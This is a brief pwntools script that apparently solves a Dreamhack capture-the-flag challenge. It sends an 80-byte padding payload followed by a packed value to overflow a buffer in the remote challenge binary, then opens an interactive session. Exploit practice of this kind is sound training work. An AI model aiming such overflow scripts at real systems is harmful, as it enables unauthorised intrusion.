from pwn import *

context.binary = exe = ELF('./chall', checksec=False)
context.log_level = 'debug'


payload = b'a'*80 + p64(1) 
r = remote('host3.dreamhack.games', 17130)
#r = process(exe.path)
#gdb.attach(r)
r.recvuntil(b'Your Input: ')
r.sendline(payload)
r.interactive()